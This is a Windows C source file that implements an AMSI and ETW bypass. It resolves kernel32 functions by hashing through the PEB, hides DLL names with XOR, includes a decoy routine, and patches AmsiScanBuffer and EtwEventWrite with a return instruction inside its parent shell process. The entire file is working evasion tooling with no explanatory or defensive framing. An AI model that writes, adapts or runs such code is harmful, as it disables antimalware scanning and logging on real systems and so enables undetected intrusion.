#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <intrin.h>

#define HASH_KERNEL32              0x7040EE75
#define HASH_CreateToolhelp32Snapshot 0x66851295
#define HASH_Process32FirstW       0xE18FC6E8
#define HASH_Process32NextW        0x9307647F
#define HASH_OpenProcess           0x7136FDD6
#define HASH_LoadLibraryA          0x5FBFF0FB
#define HASH_GetCurrentProcessId   0xA3BF64B4
#define HASH_VirtualProtectEx      0xD812922A
#define HASH_WriteProcessMemory    0x6F22E8C8
#define HASH_AmsiScanBuffer        0x29FCD18E
#define HASH_EtwEventWrite         0x24A8D022

typedef BOOL(WINAPI* pVirtProt)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* pWritemem)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD(WINAPI* pGetProcID)(void);
typedef HMODULE(WINAPI* pLoadLibA)(LPCSTR);
typedef HANDLE(WINAPI* pOpenProc)(DWORD, BOOL, DWORD);
typedef HANDLE(WINAPI* pCreateSnap)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcFirst)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pProcNext)(HANDLE, LPPROCESSENTRY32W);

typedef struct {
	pCreateSnap createsnap;
	pProcFirst procfirst;
	pProcNext procnext;
	pOpenProc openproc;
	pLoadLibA loadlib;
	pGetProcID procid;
	pVirtProt virtprot;
	pWritemem writemem;
} ApiTable;

__declspec(noinline) void xorit(char* arraddr, int len) {
	char key[] = { 0xE3, 0xB7, 0x3E, 0x91 };

	for (int x = 0; x < len - 1; x++) {
		arraddr[x] = arraddr[x] ^ key[x % 4];
	}

}

__declspec(noinline) DWORD djb2(char* str) {
	DWORD hash = 5381;
	int c;
	while (c = *str++) {
		hash = ((hash << 5) + hash) + c;
	}
	return hash;
}

__declspec(noinline) DWORD djb2i(char* str) {
	DWORD hash = 5381;
	int c;
	while (c = *str++) {
		if (c >= 'A' && c <= 'Z') c += 0x20;
		hash = ((hash << 5) + hash) + c;
	}
	return hash;
}

BOOL compstri(char* str1, char* str2) {
	int c;
	for (c = 0; str1[c] != '\0' && str2[c] != '\0'; c++) {
		char offset1 = 0x0;
		char offset2 = 0x0;
		if (str1[c] >= 'A' && str1[c] <= 'Z') offset1 = 0x20;
		if (str2[c] >= 'A' && str2[c] <= 'Z') offset2 = 0x20;
		if (str1[c] + offset1 != str2[c] + offset2) {
			return FALSE;
		}
	}
	return str1[c] == '\0' && str2[c] == '\0';
}

void wtoascii(wchar_t* src, char* dst) {
	int c;
	for (c = 0; src[c] != L'\0'; c++) {
		dst[c] = (char)src[c];
	}
	dst[c] = '\0';
}

__declspec(noinline) void* getprocbyhash(char* moduleBase, DWORD hash) {
	int peOffset = *(int*)(moduleBase + 0x3C);
	int exportRVA = *(int*)(moduleBase + peOffset + 0x88);
	char* exportTable = moduleBase + exportRVA;

	int nameCount = *(int*)(exportTable + 0x18);
	int* nameRVAs = (int*)(moduleBase + *(int*)(exportTable + 0x20));
	short* ordinals = (short*)(moduleBase + *(int*)(exportTable + 0x24));
	int* funcRVAs = (int*)(moduleBase + *(int*)(exportTable + 0x1c));

	for (int c = 0; c < nameCount; c++) {
		if (djb2(moduleBase + nameRVAs[c]) == hash) {
			return (void*)(moduleBase + funcRVAs[ordinals[c]]);
		}
	}
	return NULL;
}

__declspec(noinline) int findshell(pCreateSnap createsnap, pProcFirst procfirst, pProcNext procnext, pGetProcID procid) {
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	int ownid = procid();

	HANDLE snapshot = createsnap(0x00000002, 0);

	procfirst(snapshot, &pe);

	while (procnext(snapshot, &pe)) {
		if (pe.th32ProcessID == ownid) {
			return pe.th32ParentProcessID;
		}
	}
}

__declspec(noinline) BOOL dopatch(pVirtProt virtprot, HANDLE shell, pWritemem writemem, void* amdst, void* ntdst, char patch) {
	DWORD amsi_oldprotect;
	DWORD ntdll_oldprotect;

	if (virtprot(shell, amdst, 1, PAGE_READWRITE, &amsi_oldprotect) && virtprot(shell, ntdst, 1, PAGE_READWRITE, &ntdll_oldprotect)) {
		writemem(shell, amdst, &patch, 1, NULL);
		writemem(shell, ntdst, &patch, 1, NULL);
	}
	else {
		return 0;
	}

	if (virtprot(shell, amdst, 1, amsi_oldprotect, &amsi_oldprotect) && virtprot(shell, ntdst, 1, ntdll_oldprotect, &ntdll_oldprotect)) {
		return 1;
	}
	else {
		return 0;
	}
}

__declspec(noinline) void resolveapis1(ApiTable* t, char* k32,
	DWORD h_snap, DWORD h_p32f, DWORD h_p32n, DWORD h_oproc) {
	t->createsnap = (pCreateSnap)getprocbyhash(k32, h_snap);
	t->procfirst = (pProcFirst)getprocbyhash(k32, h_p32f);
	t->procnext = (pProcNext)getprocbyhash(k32, h_p32n);
	t->openproc = (pOpenProc)getprocbyhash(k32, h_oproc);
}

__declspec(noinline) void resolveapis2(ApiTable* t, char* k32,
	DWORD h_llib, DWORD h_gpid, DWORD h_vprot, DWORD h_wmem) {
	t->loadlib = (pLoadLibA)getprocbyhash(k32, h_llib);
	t->procid = (pGetProcID)getprocbyhash(k32, h_gpid);
	t->virtprot = (pVirtProt)getprocbyhash(k32, h_vprot);
	t->writemem = (pWritemem)getprocbyhash(k32, h_wmem);
}


__declspec(noinline) int dowork(ApiTable* api, char* amsidl, char* ntdl, DWORD h_amsiFunc, DWORD h_etwFunc) {
	HANDLE shell = api->openproc(PROCESS_ALL_ACCESS, FALSE, findshell(api->createsnap, api->procfirst, api->procnext, api->procid));

	if (!shell) {
		return 0;
	}

	HINSTANCE amsi = api->loadlib(amsidl);
	HINSTANCE ntdll = api->loadlib(ntdl);

	if (!amsi || !ntdll) {
		return 0;
	}

	void* amsiAddr = getprocbyhash((char*)amsi, h_amsiFunc);
	void* ntdllAddr = getprocbyhash((char*)ntdll, h_etwFunc);

	if (!amsiAddr || !ntdllAddr) {
		return 0;
	}

	char patch = 0xC3;
	dopatch(api->virtprot, shell, api->writemem, amsiAddr, ntdllAddr, patch);

	return 1;
}

__declspec(noinline) char* walkpeb(DWORD k32hash) {
	char* pebaddr = (char*)__readgsqword(0x60);
	char* ldr = *(char**)(pebaddr + 0x18);
	char* modlist = *(char**)(ldr + 0x20);

	while (modlist = *(char**)(modlist)) {
		char modname[256];
		wtoascii(*(wchar_t**)(modlist + 0x50), modname);
		if (djb2i(modname) == k32hash) {
			return *(char**)(modlist + 0x20);
		}
	}
	return NULL;
}

__declspec(noinline) int decoy(void) {
	char buf[64];
	DWORD sz = sizeof(buf);
	char* p = (char*)__readgsqword(0x60);
	int acc = 0;
	for (int i = 0; i < 32; i++) {
		buf[i] = (char)(i * 7 + 13);
		acc += buf[i];
	}
	return acc;
}

int main(void) {

	volatile int d = decoy();

	volatile char amsidl[] = { 0x82, 0xDA, 0x4D, 0xF8, 0xCD, 0xD3, 0x52, 0xFD, 0x00 };
	volatile char ntdl[] = { 0x8D, 0xC3, 0x5A, 0xFD, 0x8F, 0x99, 0x5A, 0xFD, 0x8F, 0x00 };

	xorit(amsidl, sizeof(amsidl));
	xorit(ntdl, sizeof(ntdl));

	char* k32 = walkpeb(HASH_KERNEL32);

	ApiTable api;
	resolveapis1(&api, k32, HASH_CreateToolhelp32Snapshot, HASH_Process32FirstW, HASH_Process32NextW, HASH_OpenProcess);
	resolveapis2(&api, k32, HASH_LoadLibraryA, HASH_GetCurrentProcessId, HASH_VirtualProtectEx, HASH_WriteProcessMemory);

	dowork(&api, amsidl, ntdl, HASH_AmsiScanBuffer, HASH_EtwEventWrite);

	return 0;
}